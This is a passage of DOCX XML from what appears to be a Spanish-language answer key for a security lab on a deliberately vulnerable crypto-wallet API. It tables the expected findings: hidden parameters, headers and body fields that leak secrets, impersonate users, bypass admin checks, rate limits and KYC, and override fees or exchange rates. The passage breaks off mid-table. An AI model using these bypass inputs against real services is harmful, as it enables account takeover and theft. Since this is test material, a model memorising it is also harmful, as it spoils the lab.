          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Magic-Signals</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header de respuesta es una pista)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Hallazgos esperados</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 - Query string params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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Param oculto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Efecto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/wallets/balance.php?wallet_id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?debug=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Devuelve query SQL, JWT_SECRET, thread_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/wallets/balance.php?wallet_id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?include=private_key,owner,*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Expone private_key y datos del owner</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/wallets/balance.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?as_user_id=N</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Lista wallets de OTRO user_id (impersonacion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/wallets/balance.php?wallet_id=X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?fields=*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Dump completo del row</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/crypto/prices.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?fields=*</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Dump de todas las columnas de crypto_prices</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET /api/v1/admin/users.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?role=admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Filtro SQLi por role</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/auth/login.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?bypass_rate_limit=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Salta rate limit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 - Headers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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Header</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Valor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Efecto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Debug-Token: 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>cualquiera no vacio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Activa modo debug en todos los endpoints (igual que </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?debug=1</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Bypass-RateLimit: 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>cualquiera no vacio</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Salta rate limit (igual que </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>?bypass_rate_limit=1</w:t>
            </w:r>
            <w:r>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Forwarded-For: 127.0.0.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>IP interna (10/8, 192.168/16, 172.16/12, 127/8)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Saltea rate limit + activa "internal mode" + bypass admin en algunos endpoints</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Real-IP: 10.0.0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>idem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Idem</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Original-URL: /api/v1/admin/users</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>path interno</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Activa "internal mode"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Api-Version: internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">string </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Activa "internal mode"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Service-Token: internal_svc_token_2024_q1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>el valor exacto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Activa "internal mode" (token sacado de Fase 1 - notes.txt o backup.sql)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>X-Admin-Token: admin_dev_bypass_v1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>el valor exacto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Bypass de </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>requireAdmin()</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/users.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 - Body JSON params (POST)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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Body param oculto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Efecto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/auth/register.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>role</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>kyc_verified</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>kyc_level</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>referral_bonus</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>balance</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Mass assignment - registrate como admin con KYC verificado</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/wallets/transfer.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>fee_override</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Override del fee (poner 0 o negativo)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/wallets/transfer.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>skip_validation: true</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Salta verificacion de saldo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/wallets/transfer.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>as_user_id: N</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Transferir desde wallet de otro user (combina con BOLA)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/crypto/swap.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>rate_override: 999999</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Manipula tasa de cambio</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/crypto/swap.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>bypass_kyc: true</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Salta verificacion KYC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST /api/v1/crypto/swap.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>fee_override: 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Sin fees</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 - Cookies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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Valor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Efecto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>debug_mode=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
